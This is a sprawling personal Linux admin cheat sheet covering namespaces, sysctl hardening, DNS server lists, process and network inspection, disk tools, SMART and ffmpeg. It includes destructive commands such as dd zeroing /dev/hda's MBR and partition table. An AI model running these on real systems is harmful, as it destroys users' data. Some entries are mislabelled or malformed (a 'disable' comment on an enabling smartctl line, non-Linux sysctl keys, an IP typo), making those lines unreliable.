 -p   			##   [+] new PID namespace
 -u   			##   [+] new UTS namespace
 -U   			##   [+] new user namespace



case   'i'			##   [+]  CLONE_NEWIPC
case  'm'			##   [+]  CLONE_NEWNS
case  'n'			##   [+]  CLONE_NEWNET
case  'p'			##   [+]  CLONE_NEWPID
case  'u'			##   [+]  CLONE_NEWUTS
case  'U'			##   [+]  CLONE_NEWUSER







##-========================================-##
##     [+] User_Namespace - Further Explaination -  :
##-========================================-##

##-==========================-##
##    		   [+]  In other Words:
##-==========================-##

##-===================================================-##
## ------------------------------------------------------------------------------------------- ##
	 [?]  The $UserID 1000 In the 
			[?]  $Parent+$User_$Namespace 
					[?]  (which was formerly mapped to 65534) 
	[?]  Has been mapped to:
		     >  $UserID 0 
	[?]  In The  $User_Namespace 
	[?]  Created By:  $demo_userns
## ------------------------------------------------------------------------------------------- ##






##-==================================-##
##     [+]  Determine $PID of $ChildClone:
##-==================================-##
ps -C demo_userns -o 'pid uid comm' 


	[+]  Create  A  $User_ID_Mapping
			[?]  For The  $ChildProcess
			[?]  In The New  $UserNamespace




echo '0 1000 1' > /proc/4713/uid_map








The $ns_child_exec - uses the $clone() system call 
to create a child process; 
the child then executes the given $Cmd
	> with the optional arguments. 

The main purpose of the options is 
to specify new namespaces 
that should be created 
as part of the $clone() call. 


For example, 

## causes the child to be created in a new PID namespace, 


$ns_child_exec  -p


as in the following example:


##  [?]  Need privilege to create a $PID_Namespace

su 


./$ns_child_exec -p sh -c 'echo $$'
#	 1

creates a child in a new $PID_Namespace
execute a shell 
echo command that displays the shells PID



use the 
$ns_child_exec 
program in conjunction with 
$simple_init 
to fire up an init process 
that runs in a new $PID_Namespace:

./$ns_child_exec -p ./$simple_init
#  init$


Well now use the two programs 
we have presented so far In conjunction 
with another small program:
$orphan.c
to demonstrate that processes 
that become orphaned inside A
$PID_Namespace
are adopted by the $PID_Namespace init process, 
rather than the system-wide init process. 

The orphan program performs a $fork() 
to create a child process. 
The parent process then exits 
while the child continues to run; 
when the parent exits, 
the child becomes an orphan. 




The child executes a loop 
that continues until it becomes an orphan 
(i.e., $getppid() returns 1); 
once the child becomes an orphan, it terminates. 
The parent and the child print messages 
so that we can see when the two processes terminate 
and when the child becomes an orphan. 



In order to see what that our 
$simple_init 
program reaps the orphaned child process


./$ns_child_exec -p ./$simple_init -v
	init: my $PID is 1
init$ ./$orphan
	init: created child 2
Parent ($PID=2) created child with $PID 3
Parent ($PID=2; $PPID=1) terminating
	init: $SIGCHLD handler: $PID 2 terminated
init$				##  $simple_init 
					## prompt interleaved with output from child
Child  ($PID=3) now an orphan (parent $PID=1)
Child  ($PID=3) terminating
	init: $SIGCHLD handler: $PID 3 terminated



Signals can also 
(subject to the usual permission checks) 
be sent to the PID namespace init process 
by processes In ancestor PID namespaces. 


the /proc filesystems (procfs) 
for the PID namespaces 
were mounted at various locations 
other than the traditional /proc mount point. 


This allowed us to use shell commands 
to look at the contents of the /proc/$PID directories 
that corresponded to each of the new PID namespace




$CLONE_NEWPID flag
In a call to $unshare() 
Creates a new PID namespace, 
But does not place the caller 
In the new namespace. 


Rather, any children created by the caller 
will be placed in the new namespace; 





The $setns() system call now supports PID namespaces: 



The fd argument is a file descriptor 
that identifies a PID namespace 
that is a descendant of the 
PID namespace of the caller; 
that file descriptor is obtained by opening the 
/proc/$PID/ns/pid file 
For one of the processes 
in the target namespace. 

As with:
$unshare()
$setns() 

does not move the caller to the 
$PID_Namespace
instead, children that are subsequently created 
by the caller will be placed in the namespace. 





$setns() with $PIDNamespaces 
that appear surprising 
until we understand what is going on. 

The new program
$ns_run.c
has the following syntax:

$ns_run -f -n /proc/$PID/ns/$FILE $Cmd $Arg

$ns_run -f -n /proc/$PID/ns/$FILE $Cmd $Arg

$ns_run -f -n /proc/$PID/ns/$FILE $Cmd $Arg

$ns_run -f -n /proc/$PID/ns/$FILE $Cmd $Arg




The program uses 
$setns() 
to join the namespaces specified 
by the 
/proc/PID/ns files 
contained within -n options. 













































Normally, a $PID_Namespace
will also be destroyed 
when its init process terminates. 

However, there is an unusual corner case: 
the namespace wont be destroyed 
as long as a 
/proc/$PID/ns/pid file 
For one of the processes in that namespaces 
is bind mounted 
or 
held open


However, it is not possible 
to create new processes 
in the namespace 
(via $setns() 
plus $fork())

#$
the lack of an init process 
is detected during the $fork() call, 












Mounting a procfs filesystem



















































sysctl -w net.ipv6.conf.default.disable_ipv6="1"
sysctl -w net.ipv6.conf.all.disable_ipv6="1"
sysctl -q -w net.ipv6.conf.all.disable_ipv6="1"
sysctl -w net.ipv6.conf.lo.disable_ipv6="1"

sysctl -w net.ipv6.conf.all.autoconf="0"


sysctl -w net.ipv6.conf.all.accept_redirects="0"

sysctl -w net.ipv6.conf.all.accept_dad="0"
sysctl -w net.ipv6.conf.all.accept_ra="0"
sysctl -w net.ipv6.conf.all.dad_transmits="0"
sysctl -w net.ipv6.conf.default.router_solicitations="0"


sysctl -w net.ipv6.conf.all.accept_redirects=0
sysctl -w net.ipv6.conf.all.send_redirects=0

sysctl -w kernel.exec-shield=1
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.ipv4.conf.all.accept_redirects=0
sysctl -w net.ipv4.conf.all.send_redirects=0

sysctl -w net.ipv4.conf.all.rp_filter=1
sysctl -w net.ipv4.conf.default.rp_filter=1
sysctl -w net.ipv4.conf.lo.rp_filter="1"
net.ipv4.conf.eth0.rp_filter=1

sysctl -w net.ipv4.conf.default.arp_filter=1
sysctl -w net.ipv4.conf.eth0.arp_filter=


sysctl -w net.ipv4.icmp_echo_ignore_all=1

sysctl -w net.ipv4.tcp_timestamps=

sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1

sysctl -w net.ipv4.icmp_ignore_bogus_error_responses=1

sysctl -w net.ipv4.conf.all.log_martians=1
sysctl -w net.ipv4.conf.default.log_martians=1
sysctl -w net.ipv4.conf.eth0.log_martians="1"
sysctl -w net.ipv4.conf.lo.log_martians="1"

/proc/fs/ext4/sda1/options
/proc/fs/ext4/sdb1/options


sysctl -w dev.cdrom.debug=1
sysctl -w dev.cdrom.check_media="1"
sysctl -w dev.scsi.logging_level="1"
sysctl -q -w net.netfilter.nf_conntrack_timestamp="1"
sysctl -q -w net.ipv4.tcp_timestamps="1"
sysctl -w fs.suid_dumpable=0
cat /proc/sys/fs/suid_dumpable
sysctl -w kernel.ctrl-alt-del=0


sysctl -w kernel.dmesg_restrict=1                                                    ## This toggle indicates whether unprivileged users are prevented from using dmesg(8) to view messages from the kernel's log buffer.
sysctl -w kernel.stack_tracer_enabled="1"
sysctl -w noexec_user_stack="1"
sysctl -w noexec_usr_stack_log="1"
set noexec_user_stack=1
set noexec_usr_stack_log=1
sysctl -w kernel.randomize_va_space="2"
sysctl -w kern.securelevel="2"
sysctl -w kernel.kptr_restrict="1"                  ## This toggle indicates whether restrictions are placed on exposing kernel addresses via /proc and other interfaces.

echo "#Enable ExecShield protection"
sysctl -w kernel.exec-shield="1"
set kernel.exec-shield="1"
sysctl -w kernel.sysctl_writes_strict="1"
echo "#Enabling kernels use of pids"
sysctl -w kernel.core_uses_pid="1"   # Controls whether core dumps will append the PID to the core filename
sysctl -w kernel.randomize_va_space="2"

printk_devkmsg="ratelimit"                          ## Control the logging to /dev/kmsg from userspace
perf_event_paranoid="2"                             ## Controls use of the performance events system by unprivileged users (without CAP_SYS_ADMIN).  The default value is 2.

sysctl -w kernel.stack_tracer_enabled=1
sysctl -w kernel.ftrace_enabled=1
sysctl -w kernel.ftrace_dump_on_oops=1
sysctl -w kernel.tracepoint_printk
sysctl -w kernel.unprivileged_bpf_disabled=0
sysctl -w kernel.unprivileged_userns_apparmor_policy=1
sysctl -w kernel.unprivileged_userns_clone=
sysctl -w kernel.yama.ptrace_scope

sysctl -w net.core.bpf_jit_enable=1
sysctl -w net.core.bpf_jit_harden=1
## net.core.bpf_jit_kallsyms=1

/sys/kernel/debug/tracing/options/verbose
/sys/kernel/debug/tracing/options/userstacktrace
/sys/kernel/debug/tracing/options/func_stack_trace
/sys/kernel/debug/tracing/options/function-trace
/sys/kernel/debug/tracing/tracing_on

/proc/sys/net/netfilter/nf_log_all_netns
/proc/sys/net/ipv4/conf/all/src_valid_mark

cat -vT /sys/module/ipv6/parameters/autoconf
/sys/module/ipv6/parameters/disable
/sys/module/ipv6/parameters/disable_ipv6

sysctl -w net.ipv6.conf.all.autoconf

/sys/module/ipv6/parameters/autoconf=0
/sys/module/ipv6/parameters/disable_ipv6=1
/sys/module/ipv6/parameters/disable=1

/sys/module/apparmor/parameters/debug
/sys/module/apparmor/parameters/enabled
/sys/module/apparmor/parameters/logsyscall
/sys/module/apparmor/parameters/mode


sysctl -p

chmod 0644 /etc/sysctl.conf 
chown root:root /etc/sysctl.conf


user.max_cgroup_namespaces
user.max_ipc_namespaces
user.max_mnt_namespaces
user.max_net_namespaces = 63777
user.max_pid_namespaces = 63777
user.max_user_namespaces = 63777
user.max_uts_namespaces = 63777
net.netfilter.nf_log_all_netns


fs.xfs.error_level=3
fs.xfs.inherit_nodump
fs.xfs.inherit_sync
fs.xfs.irix_sgid_inherit
fs.xfs.panic_mask
fs.xfs.rotorstep
fs.xfs.speculative_cow_prealloc_lifetime
kernel.acct


sysctl -w kernel.kptr_restrict
sysctl -w kernel.modules_disabled


kernel.seccomp.actions_avail = kill_process kill_thread trap errno trace log allow
kernel.seccomp.actions_logged = kill_process kill_thread trap errno trace log


net.core.netdev_rss_key

vm.zone_reclaim_mode
vm.numa_zonelist_order

net.netfilter.nf_conntrack_timestamp=1
net.netfilter.nf_conntrack_log_invalid=1
net.netfilter.nf_conntrack_helper=1
net.netfilter.nf_conntrack_events=1
net.netfilter.nf_conntrack_acct=1
net.netfilter.nf_conntrack_checksum=1
net.netfilter.nf_conntrack_count=0
net.netfilter.nf_log_all_netns=1
net.ipv4.tcp_abort_on_overflow

net.ipv4.ip_unprivileged_port_start

net.ipv4.conf.lo.src_valid_mark

net.ipv4.conf.lo.drop_unicast_in_l2_multicast

debug.kprobes-optimization








## ############### ##
## DNSVariables.sh
## ############### ##


## --------------------------------------- ##
	OpenDNS1="208.67.222.222"
	export OpenDNS1=208.67.222.222
## --------------------------------------- ##
	OpenDNS2="208.67.220.220"
	export OpenDNS2="208.67.220.220"
## --------------------------------------- ##


## --------------------------------------- ##
	OpenNIC="185.121.177.177"
	export OpenNIC="185.121.177.177"
## --------------------------------------- ##


## --------------------------------------- ##
	FrozenDNS1="92.222.97.144"
	export FrozenDNS1="92.222.97.144"
## --------------------------------------- ##
	FrozenDNS2="92.222.97.145"
	export FrozenDNS2="92.222.97.145"
## --------------------------------------- ##
	FrozenDNS3="192.99.85.244"
	export FrozenDNS3="192.99.85.244"
## --------------------------------------- ##


## --------------------------------------- ##
	MullvadDNS="193.138.219.228"
	export MullvadDNS="193.138.219.228"
## --------------------------------------- ##


## ###################################### ## 
## ______ FrozenDNS _______
## nameserver 92.222.97.144
## nameserver 92.222.97.145
## 
## _______ OpenDNS _________
## nameserver 208.67.222.222
## nameserver 208.67.220.220
## ###################################### ## 
--ip=192.168.2.34 --dns=208.67.222.222
--ip=192.168.2.34 --dns=208.67.220.220








# FrozenDNS
nameserver 92.222.97.144
nameserver 92.222.97.145
nameserver 192.99.85.244

# ParrotDNS/OpenNIC
nameserver 139.99.96.146
nameserver 37.59.40.15
nameserver 185.121.177.177


# OpenDNS
nameserver 208.67.222.222
nameserver 208.67.220.220


# OpenNIC
nameserver 185.121.177.177

# Mullvad
nameserver 193.138.219.228

## =================================================================== ##
##	Add these ip addresses to network managers connections editor	   ##
## 			Under ipv4 settings, add this line to DNS Servers		   ##
## =================================================================== ##
92.22.97.145,185.121.177.177,192.99.85.244,208.67.222.222,208.67.220.220


























lsof /var/log/Xorg.0.log
ps ax | grep Xorg | awk '{print $1}'            ## 
ps ax | grep Xorg | awk '{print $1}'            ## Find opened log file for Xorg:


xdpyinfo | awk '/dimensions:/ {print $2}'		## grabbing the screen resolution (width x height)
xrandr --listmonitors                           ## 
xrandr --listactivemonitors
xrandr --query                  ## display the current state of the system.
xrandr --current                ## List current monitors 
xvidtune -show                  ## Print  the  currently selected settings to stdout in xorg.conf


xlsclients -l                   ## list client applications running on a display
xvinfo -display                    # Print out X-Video extension adaptor information




##-================================================================================-##"
##   [+] Pring details about the usage of CPU, I/O, memory, and network devices
##-================================================================================-##"
sar –u –r –n DEV



cat /etc/cron.d/sysstat

# Run system activity accounting tool every 10 minutes
*/10 * * * * root /usr/lib64/sa/sa1 -S DISK 1 1
# 0 * * * * root /usr/lib64/sa/sa1 -S DISK 600 6 &
# Generate a daily summary of process accounting at 23:53
53 23 * * * root /usr/lib64/sa/sa2 -A



## shows CPU usage

sar -u | less

sar -d | less

## see how much activity came across the
## different network interfaces on your system

sar -n DEV 5 2










## Terminal Recorders
script -a -tscript.timing script.output


## Record shell : Ctrl-D stops
script -a $OutFile



## record terminal session
scriptreplay -m1 -tscript.timing script.output


## The tmux terminal multiplexer now supports logging by using the pipe-pane option:

tmux pipe-pane -o -t session_index:window_index.pane_index 'cat >> ~/output.window_index-pane_index.txt'








ls --human-readable --size --file-type --numeric-uid-gid --group-directories-first --classify --si --color=always
ls --all --recursive --classify --color=always --format=single-column --group-directories-first 


stat --format=[%A/%a]:[%n]:[Size:%s.bytes]:[Uid:%u]:[User:%U]:[Group:%G]:[GID:%g]:[IO-Block:%o]:[File-type:%F]:[Inode:%i] $1

stat --format=%a:%A:%B:%F:%n:%s:%u:%U:%C:%b:%i
stat --format=%A:%a:%n:Size:%sbytes:Uid:%U:%u:Gid:%G:%g:IO Block:%o:File type:%F:Inode:%i
stat --format=%A:%a:%n:Size:%sbytes:%U:%u:%G:%g:%o:%b:%B:%F



umask 077






users | tr ' ' '\n' | sort | uniq			# print unique users with sort and uniq:

id                  ## Show the active user id with login and group
last                ## Show last logins on the system
who                 ## Show who is logged on the system


alias who='(who --boot; who --all; who --mesg; who --ips; who -T; who --dead; who -b -d --login -p -r -t -T -u) > who.txt'
(dmesg --kernel; dmesg --raw; dmesg --userspace; dmesg) > dmesg.txt



lastb --system --fullnames



pkg-config --list-all





pmap
pgrep -u root sshd
pcat
psview
pstree --arguments --show-pids --show-pgids --show-parents > pstree.txt


(ps -aux; ps -ejH; ps -eLf; ps axjf; ps axms; ps -ely; ps -ef; ps -eF;  ps -U root -u root u; ) > ps-dump.txt


(ps -eo 'pid,user,group,nice,vsz,rss,comm') > ps-table-dump.txt


ps -ef | awk '$1 == "root" && $6 != "?" {print}'


ps aox 'pid,user,args,size,pcpu,pmem,pgid,ppid,psr,tty,session,eip,esp,start_time' > ps-columns.txt




ps -C $Cmd -o 'pid uid comm'      # Determine PID of clone child











stat



iconvert $File.png $File.jpg




chacl -l
setfacl -m u:root:ro 
getfacl file1 | setfacl --set-file=- file2      ## Copying the ACL of one file to another
mkdir --mode=0644 
chattr s                ## secure deletion (s)
immutable (i)


--dump
setpriv --reuid=1000 --regid=1000 
--bounding-set
--inh-caps (+|-)
--list-caps
--no-new-privs
--securebits noroot,noroot_locked,  no_setuid_fixup,  no_setuid_fixup_locked,  and  keep_caps_locked
--apparmor-profile 


egrep -r 127.0.0.1: /etc/*

find / -name "<file>*" -print						# Find all files whose name start with foo and print their path
find / -name "<file>*" -exec chmod 700 {} \;		# Find all files whose name start with foo and apply permission 700 to
find / -name "<file>*" -exec du {} \; | sort -nr
find / -name "<file>*" -ok mv {} /tmp/joe/ \;
find . -type f -print | xargs chmod 0640
(find / -type f -perm 04000 -ls; find / -type f -perm 02000 -ls; find / -nouser; find / -nogroup; find / -name .rhosts -type f -print 2> /dev/null) > find-dump.txt
fuser ‐m /home
fuser ‐va /home                 ## List processes accessing the /home partition
lsof /home
kill $(lsof -t /home)


watch -n 1 lsof -nPi tcp:22
watch ss -tp

lsof ‐p
lsof -i                                     ## Established connections

netstat ‐an | grep LISTEN
netstat ‐anp ‐‐udp ‐‐tcp | grep LISTEN
netstat ‐tupl
netstat ‐tup
netstat -tupln | grep $Service


(netstat --all; netstat --programs; netstat --statistics; netstat --groups; netstat --interfaces; netstat --route) > netstat-dump.txt



lsof ‐i



mke2fs -j -b 4096 /dev/sdb                  ## Formats using large block size (Default is 1024-byte blocks)

dumpe2fs /dev/sda3 | grep "Block count"



badblocks -o badblocks.rpt /dev/sda3 $TotalBlockCount

e2fsck -f -l badblocks.rpt /dev/sda1

debugfs -w /dev/sda1 						## debugfs device Interactive ext2/ext3/ext4 filesystem debugger

dumpe2fs -h /dev/sda1						## Display filesystems superblock information (e.g. number of mounts, last checks, UUID)
dumpe2fs /dev/sda1 | grep -i superblock     ## Display locations of superblock (primary and backup) of filesystem
dumpe2fs -b /dev/sda1						## Display blocks that are marked as bad in the filesystem

tune2fs -l /dev/sdc1 | grep "mount options"

tune2fs -j /dev/sda1 				# Add a journal to this ext2 filesystem, making it a ext3
tune2fs -C 4 /dev/sda1 				# Set the mount count of the filesystem to 4
tune2fs -c 20 /dev/sda1 			# Set the filesystem to be checked by fsck after 20 mounts
tune2fs -i 15d /dev/sda1 			# Set the filesystem to be checked by fsck each 15 days


dumpe2fs -h /dev/sda1 | grep -i 'mount count'

tune2fs -c 20 /dev/sda1

fsck.mode=force




tune2fs -c 4 -i 1m                  ## Max mount count 4 or Check interval 1 Month

tune2fs -l			                    ## List the contents of the filesystem superblock
tune2fs -o debug
tune2fs -o user_xattr
tune2fs -o acl
tune2fs -o journal_data
tune2fs -o journal_data_ordered
tune2fs -o journal_data_writeback
	
tune2fs -O [^]feature
tune2fs -O dir_index
                          Use hashed b-trees to speed up lookups for large directories.
tune2fs -O ea_inode
                          Allow  the value of each extended attribute to be placed in the data blocks of a separate inode if neces‐
                          sary, increasing the limit on the size and number of extended attributes  per  file.
tune2fs -O encrypt
                          Enable file system level encryption. 
tune2fs -O extent Enable  the  use  of extent trees to store the location of data blocks in inodes.

tune2fs -O extra_isize
                          Enable the extended inode fields used by ext4.
tune2fs -O has_journal

tune2fs -O read-only         
tune2fs -O quota                          
tune2fs -O mmp    Enable or disable multiple mount protection (MMP) feature.

tune2fs -O metadata_csum

tune2fs -Q 
	[^]usrquota		Sets/clears user quota inode in the superblock.
	[^]grpquota		Sets/clears group quota inode in the superblock.	
	[^]prjquota		Sets/clears project quota inode in the superblock.

tune2fs -U random|time		## Set  the  universally  unique identifier (UUID) of the filesystem to UUID. 


hdparm -g /dev/hda 			## Display drive geometry (cylinders, heads, sectors) of /dev/hda
hdparm -i /dev/hda 			## Display identification information for /dev/hda
hdparm -tT /dev/hda 		## Perform benchmarks on the /dev/hda drive

mount -o remount -o acl


cat /proc/$$/status | egrep '^[UG]id'

cat /proc/$$/uid_map



ls -l /dev/disk/by-id
ls -R /dev/mapper

udevadm info --attribute-walk --name=/dev/sda

parted --list print all
zuluMount-cli -l
udisksctl dump
cat /proc/partitions
mount | column ‐t

mount -t tmpfs none /mnt -o 'context="system_u:object_r:tmp_t:s0:c127,c456",noexec'

mount /tmp/disk.img /mnt -o loop
mount -t ext3 /tmp/disk.img /mnt

mount -t overlay  overlay -olowerdir=/lower,upperdir=/upper,workdir=/work  /merged

mkfs.xfs -l logdev=/dev/sdb1,size=10000b /dev/sda1

## Prints the start sector of partition 5 on /dev/sdb without header.
partx -o START -g --nr 5 /dev/sdb

## Lists the length in sectors and human-readable size of partition 5 on /dev/sda.
partx -o SECTORS,SIZE /dev/sda5 /dev/sda







mkdir --mode=0620 /mnt/cdrom/
mkdir --mode=0755 /mnt/cdrom/

mount -t iso9660 /dev/sr0 /mnt/cdrom -o ro,nodev,nosuid
mount -t iso9660 -o ro,loop=/dev/loop0 cd_image /cdrom
mount -t iso9660 /run/media/public/2TB/OS/ParrotSec/Parrot-full-3.2_amd64.iso /mnt/cdrom -o loop,ro,nosuid

chmod -v -R ugo+rwx /mnt/cdrom/
chown -v -R parrotkios /mnt/cdrom/
umount /dev/sr0 /mnt/cdrom

dd status=progress if=/dev/sr0 of=~/cdrom.iso



mount -t vfat /dev/sda /mnt/poo -o sys_immutable,ro,nosuid,noexec,nodev,noauto,errors=remount-ro
/dev/sda /mnt/poo vfat ro,nosuid,nodev,sys_immutable,noauto,errors=remount-ro 0 0



echo "Monitors remounts to read-only mode on all ext3 filesystems."
findmnt --poll=remount -t ext3 -O ro





alias du='du --human-readable --all --apparent-size --separate-dirs'
(du --human-readable --all --apparent-size --separate-dirs) > du.txt
(sfdisk --show-size; sfdisk --show-pt-geometry; sfdisk --show-geometry) > sfdisk-dump.txt

##-==============================================================-##
##  [+] 

udevadm info -a -n /dev/sda
udevadm info /sys/class/net/eth0
udevadm info /sys/class/net/wlan0

udevadm trigger --action=add
udevadm control --reload-rules

lsusb
lsdev
lshw
lsipc
lsdev
hddtemp /dev/sdb
smartctl -x /dev/sdb
hwinfo --short
hwinfo --block --short                  ##  Show all detected mountable Drives/Partitions/BlockDevices
lshw -class storage
lshw -class disk -class storage
lshw -html -class network

lsblk --topology --all --paths --fs
lsblk --all --perms --list
lsblk --all --perms --topology --fs --raw

lsblk -o KNAME,TYPE,FSTYPE,SIZE,LABEL
lsblk -o KNAME,ROTA,RO,RM,STATE,MOUNTPOINT

lscpu
lspci
lsscsi


dmidecode --dump >> $TEMP_DIR/dmidump.txt
dmidecode --dump-bin dmibin.bin
dmidecode --from-dump dmibin.bin

$sfdisk=sfdisk --show-size --show-pt-geometry --show-geometry

sfdisk /dev/sda -O hdd-partition-sectors.save   ## save the sectors layout with sfdisk
sfdisk /dev/sda -I hdd-partition-sectors.save   ## recover the old sectors with backup


sfdisk -dx /dev/hda > $PartInfo.txt    ## Fetch partition table information:
/lib/systemd/system/systemd-rfkill.service
/lib/systemd/systemd-rfkill
/lib/udev/rules.d/61-gnome-settings-daemon-rfkill.rules


sfdisk --backup /dev/sda                    ## full (binary) backup - all sectors where the partition table is stored


sfdisk --dump /dev/sda > sda.dump           ## save desc of device layout to a text file.
sfdisk /dev/sda < sda.dump                  ## later restored by:

sfdisk –d /dev/sda > sda-table              ## Back up partition table to file
sfdisk /dev/sda < sda-table                 ## Restore partition table from file
sfdisk –d /dev/sda | sfdisk /dev/sdb        ## Copy partition table from disk to disk


nvme smart-log /dev/nvme1           ## View the nvmes internal smart log.
nvme id-ctrl /dev/nvme1 -H          ## check # of namespaces supported and used
nvme id-ns /dev/nvme0n1             ## check the size of the namespace
nvme-get-ns-id



dd if=/dev/zero of=/dev/hda bs=446 count=1							## blank your boot code
dd if=/dev/zero of=/dev/hda bs=512 count=1							## clear the complete MBR + partition table:
dd if=/dev/hda of=/home/knoppix/mbr_backup bs=512 count=1			## Save the MBR
dd if=/home/knoppix/mbr_backup of=/dev/hda bs=446 count=1			## restores the boot code in the MBR.
dd if=mbr_backup of=/dev/hda bs=512 count=1							## restore the full 512 bytes to the MBR with:


blockdev --setro /dev/sd            ## Set read-only
blockdev --setrw                    ## Set read-write.
blockdev --getbsz /dev/sda1         ## Print blocksize in bytes
blockdev --report



cat /sys/block/sda/queue/logical_block_size
cat /sys/block/sdc/queue/logical_block_size

cat /sys/block/sda/queue/physical_block_size
cat /sys/block/sdc/queue/physical_block_size

blockdev --getpbsz /dev/sda
blockdev --getpbsz /dev/sdc

blockdev --getss /dev/sda
blockdev --getss /dev/sdc


##-======================================================================================-##
##   specifying the 4096-byte sector size with the -b flag, the sectors of
##   the Linux partition are represented as 4K units, and there is no unallocated
##   area at the end of the drive.
##-======================================================================================-##
mmls -b 4096 /dev/sde




pvdisplay --columns --all --verbose         ## displaying the attributes of a physical volume
vgdisplay --verbose                         ## displaying the attributes of volume groups
lvdisplay                                   ## displays the attributes of a logical volume
vgck --verbose                              ## checking the volume group metadata
lvmdump                                     ## creates lvm2 information dumps for diagnostic purposes
lvmdiskscan                                 ## scans for all the devices visible to lvm2


blkid -U                        ## Print the name of the specified partition, given its UUID:
findfs UUID=                    ## Print the name of the specified partition, given its UUID:
blkid -L                        ## Print the UUID of the specified partition, given its label:
findfs LABEL=                   ## Print the name of the specified partition, given its label:

parted --list
partprobe --summary
parted /dev/sda print
findmnt --fstab --evaluate
showmount --all


watch -n 1 cat /proc/softirqs
watch -n 1 cat /proc/interrupts 
hdparm ‐i /dev/sda                ## Drive information by kernel drivers at the system boot time
hdparm ‐I /dev/sda                      ## Display drive information taken directly from the drive itself:
hdparm -g /dev/hda                          ## Display drive geometry (cylinders, heads, sectors) 

hdparm -r1 /dev/sda                 ## set a disk to read-only by setting a kernel flag

hdparm -t /dev/sda                      ## Performs & Displays Hard Drive Read Timings:	
hdparm -T /dev/sda                        ## Performs & Displays Device Cache Read Timings:
hdparm -H /dev/sda                  ## Read the temperature

cpufreq-info --debug

dumpe2fs -h /dev/sda1

## ------------------------------------------------------------------------------------------------- ##
    smartctl -a /dev/sda 			        ## Print SMART information for drive /dev/sda
## ------------------------------------------------------------------------------------------------- ##
    smartctl -s on --saveauto=on -t offline /dev/sda		## Disable SMART monitoring and log collection for drive /dev/sda
## ------------------------------------------------------------------------------------------------- ##
    smartctl -t long /dev/sda		        ## Begin an extended SMART self-test on drive /dev/sda
## ------------------------------------------------------------------------------------------------- ##
    smartctl -q errorsonly -H -l selftest /dev/sda
## ------------------------------------------------------------------------------------------------- ##
    smartctl -l error /dev/sda              ## View devices error logs
## ------------------------------------------------------------------------------------------------- ##
    smartctl -H /dev/sda			        ## Overall health report on the device
## ------------------------------------------------------------------------------------------------- ##
    smartctl -i /dev/sda			        ## details on a specific device
## ------------------------------------------------------------------------------------------------- ##
    smartctl --scan
## ------------------------------------------------------------------------------------------------- ##
    smartctl -x	/dev/sda                    ## smartctl --xall
## ------------------------------------------------------------------------------------------------- ##
    smartctl -c	/dev/sda                    ## smartctl --capabilities
## ------------------------------------------------------------------------------------------------- ##
    smartctl -A /dev/sda                    ## smartctl --attributes 
## ------------------------------------------------------------------------------------------------- ##
    smartctl -P showall | less              ## Show which devices are supported
## ------------------------------------------------------------------------------------------------- ##


killall -HUP smartd




smartctl --scan | grep "${DEVICE}" | cut -d' ' -f3)
smartctl --smart=on --offlineauto=on --saveauto=on /dev/sda						## (Enables SMART on first disk)


smartd -d -i 30                 ## Run in foreground (debug) mode, checking the disk status every 30 seconds.
smartd -q onecheck              ## Registers devices, and checks the status of the devices exactly once.
killall -HUP smartd             ## re-read the configuration file
kill -SIGUSR1 <pid>
kill -SIGUSR1 (pgrep smartd)
killall -USR1 smartd



drive min and max temperatures (-W directive)



## Save disk states to {PREFIX}MODEL-SERIAL.TYPE.state
## [default is /var/lib/smartmontools/smartd.MODEL-SERIAL.TYPE.state]
--savestates=PREFIX




## Report transactions for one of: ioctl[,N], ataioctl[,N], scsiioctl[,N], nvmeioctl[,N]
--report=
ioctl               ## report all ioctl() transactions.
scsiioctl           ## Report only ioctl() transactions with SCSI devices
ataioctl            ## Report only ioctl() transactions with ATA devices.
nvmeioctl           ## Report only ioctl() transactions with NVMe devices


## Use syslog facility local0 - local7 or daemon [default]
--logfacility=
daemon [default]
local0
local1
local2
local3
local4
local5
local6
local7



--pidfile=              ## Write PID file NAME



--interval=1800     ## 1800 seconds [default]

-f      Monitor 'Usage' Attributes, report failures


-H      Monitor SMART Health Status, report if failed


-o VAL  Enable/disable automatic offline tests (on/off)
  -S VAL  Enable/disable attribute autosave (on/off)


-p      Report changes in 'Prefailure' Attributes
  -u      Report changes in 'Usage' Attributes

  -C ID[+] Monitor [increases of] Current Pending Sectors in Attribute ID

  -W D,I,C Monitor Temperature D)ifference, I)nformal limit, C)ritical limit


--attributelog=
/var/lib/smartmontools/attrlog.MODEL-SERIAL.ata.csv


--configfile=/etc/smartd.conf


--capabilities


--debug

## Run executable NAME on warnings
--warnexec=/usr/share/smartmontools/smartd_warning.sh







grep MemTotal /proc/meminfo



udevadm info /dev/sdb | grep ID_SERIAL
grep -c '^processor' /proc/cpuinfo
cat -vET /proc/cpuinfo | grep --color -E "vmx|svm|lm"





dmidecode -t processor
cat /proc/cpuinfo
dmidecode -t memory				## view the memory, including slots used, size, data width, speed
cat /proc/meminfo
grep MemTotal /proc/meminfo
watch ‐n1 'cat /proc/interrupts'
free ‐m
cat /proc/devices
lspci ‐tv
lsusb ‐tv
lsusb --verbose -t
lsusb | grep Logitech


cat /sys/bus/usb/devices/*/product

pvdisplay


-protocols
--list-protocols
--disable-protocol=
protocol_whitelist




## setup a listening TCP connection with ffmpeg
ffmpeg -i <input> -f <format> tcp://<hostname>:<port>?listen


## play back a stream from the TLS/SSL server using ffplay:
ffplay tcp://<hostname>:<port>


## create a TLS/SSL server that serves an input stream.
ffmpeg -i <input> -f <format> tls://<hostname>:<port>?listen&cert=<server.crt>&key=<server.key>


## Play a file stored on remote server.
ffplay sftp://user:password@server_address:22/home/user/resource.mpeg


## Write the MD5 hash of the encoded AVI file to the file output.avi.md5
ffmpeg -i input.flv -f avi -y md5:output.avi.md5
ffmpeg -i input.flv -f avi -y sha1:output.avi.sha1




Rip audio from a video file.
mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile <output-file> <input-file>

Record a screencast and convert it to an mpeg
ffmpeg -f x11grab -r 25 -s 800x600 -i :0.0 /tmp/outputFile.mpg





cat /sys/kernel/debug/pktcdvd/pktcdvd[0-7]/info                 ##read pktcdvd device infos in human readable form


wodim -scanbus

genisoimage -print-size

wodim -checkdrive

wodim -prcap Print  the  drive  capabilities
 
wodim --devices          ## Look  for  useable  devices
 
wodim -toc   Retrieve and print out the table of content or PMA of a CD.

wodim -msinfo

wodim -fix   The disk will only be fixated

wodim -eject Eject disk after doing the work. 


genisoimage -print-size

genisoimage -v -o $File.iso 

dvd+rw-mediainfo /dev/sr0
cdrwtool -i /dev/sr0                            ## Print disc track info

cdrwtool -i             ## Print disc track info
